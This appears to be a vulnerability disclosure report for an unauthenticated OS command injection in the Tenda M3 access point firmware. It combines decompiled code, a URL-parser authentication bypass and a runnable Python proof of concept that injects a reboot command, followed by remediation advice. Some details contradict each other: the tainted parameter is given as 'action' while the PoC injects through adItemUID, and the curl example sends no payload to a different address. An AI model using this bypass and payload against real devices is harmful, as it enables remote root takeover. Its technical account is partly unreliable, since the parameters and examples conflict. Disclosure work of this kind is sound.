## CVE Report #79: OS Command Injection in formSetAdInfoDetail

### 1. Basic Information

| Field | Value |
|-------|-------|
| **Vendor** | Tenda |
| **Product** | M3 (AC1200 Wireless MU-MIMO Gigabit Ceiling AP) |
| **Affected Version** | 1.0.0.6 |
| **Firmware Component** | httpd (ARM 32-bit web server) |
| **Vulnerability Type** | OS Command Injection (CWE-78) |
| **Attack Vector** | Remote (Network) |
| **Authentication** | Not required (bypass via URL parser mismatch) |
| **Source Function** | `formSetAdInfoDetail` at `0x92e5c` (function start: `0x92d98`) |
| **Sink Address** | `0x8eaa4` |
| **Tainted Parameter** | `action` |
| **HTTP Endpoint** | `/goform/setAdInfoDetail` |

### 2. Description

A os command injection vulnerability exists in the `formSetAdInfoDetail` function of the Tenda M3 firmware v1.0.0.6 httpd binary. The user-controlled `action` parameter is passed to a sprintf() function without proper sanitization, allowing an attacker to inject arbitrary OS commands via shell metacharacters. The web server runs with root privileges on the embedded Linux system without modern exploit mitigations (no ASLR, no stack canaries), making exploitation straightforward.

### 3. Root Cause Analysis

#### 3.1 Vulnerable Sink 


The vulnerability is located in function `formSetAdInfoDetail` starting at address `0x92d98`. User input reaches this function via the HTTP POST parameter `action`. The tainted data flows from the source at offset `0x92e5c` to the sink at offset `0x8eaa4` without proper boundary validation.

**Key dangerous functions identified:** sprintf()

**Decompiled Source:**
```c
void __fastcall formSetAdInfoDetail(_DWORD *a1)
{

  memset(src, 0, sizeof(src));
  s1 = sub_276D0((int)a1, "action", (int)"add");
  ...

int __fastcall sub_8E600(_DWORD *a1, const char *a2)
{
  ...
  for ( i = 0; i <= 7; ++i )
  {
    if ( (unsigned int)i < *a1 && LOBYTE(a1[8 * i + 1]) )
    {
      memset(v6, 0, sizeof(v6));
      memset(v5, 0, sizeof(v5));
      if ( !strstr((const char *)&a1[8 * i + 1], "img_P_1000000000000_") )
      {
        if ( strstr((const char *)&a1[8 * i + 1], a2) )
        {
          sprintf(v6, "rm -rf %s/%s", "webroot/images/push_images", (const char *)&a1[8 * i + 1]);
          sprintf(v5, "rm -rf %s/%s", "/mnt/s_brcmnand", (const char *)&a1[8 * i + 1]);
        }
      }
      doSystemCmd(v6);
      result = doSystemCmd(v5);
    }
  }
```

#### 3.2 Authentication Bypass (Pre-condition)

All `/goform/` requests pass through `R7WebsSecurityHandler` (0x2ae74) before reaching their handler. This function acts as an authentication gate, but contains a parser mismatch vulnerability:

| Component | Function | Parsing | Behavior |
|-----------|----------|---------|----------|
| Auth gate | `R7WebsSecurityHandler` (0x2ae74) | `strstr(haystack, needle)` | **substring** match anywhere in URL |
| Dispatcher | `websFormHandler` (0x15984) | `strchr(url, '/')` segment extraction | extracts text between 2nd and 3rd `/` |

The auth gate uses a **negative whitelist**: `if (!strstr(haystack, "/goform/ate")) { /* check auth */ }`. Because `strstr` matches substrings, any URL **containing** `/goform/ate` anywhere will skip authentication entirely.

The dispatcher independently extracts the handler name from the path segment between the 2nd and 3rd `/` characters.

Therefore a single URL satisfies both:
- **Auth gate**: `strstr(url, "/goform/ate")` finds the suffix → skips auth → returns ALLOW
- **Dispatcher**: extracts `setAdInfoDetail` from `/goform/setAdInfoDetail/goform/ate` → calls `formSetAdInfoDetail`

**Bypass URL**: `/goform/setAdInfoDetail/goform/ate`

No login credentials, session token, or cookie is required.


### 4. Proof of Concept (Unauthenticated)

```python
#!/usr/bin/env python3
"""
PoC for Tenda M3 1.0.0.6 - #79: Unknown in formSetAdInfoDetail
No authentication required.
"""
import requests

TARGET = "http://192.168.0.1"
url = f"{TARGET}/goform/setAdInfoDetail/goform/ate"

payload = {'action': 'add', 'adItemUID': 'foo;reboot;#', 'adStyle': '0'}

try:
    resp = requests.post(url, data=payload, timeout=10)
    print(f"[+] Status: {resp.status_code}")
    print(f"[+] Response: {resp.text[:500]}")
except requests.exceptions.ConnectionError:
    print("[!] Connection refused - device may have crashed")
except Exception as e:
    print(f"[!] Error: {e}")
```

```bash
# curl equivalent — no credentials needed
curl "http://192.168.1.1/goform/setAdInfoDetail/goform/ate" \
  -d ""
```

### 5. Impact

Successful exploitation allows a remote attacker to execute arbitrary OS commands on the device with root privileges, leading to Remote Code Execution (RCE). This results in complete device compromise, enabling data exfiltration, network pivot, persistent backdoor installation, and further lateral movement within the network.

### 6. Remediation

- Eliminate all uses of system() and popen() with user-controlled input; use parameterized execve() or dedicated API calls instead.
- Implement strict input validation using allowlists for all user-supplied parameters reaching command execution.
- Apply proper authentication and authorization checks on all endpoints that invoke OS commands.
- Consider using a minimal command dispatch framework that validates and sanitizes inputs before execution.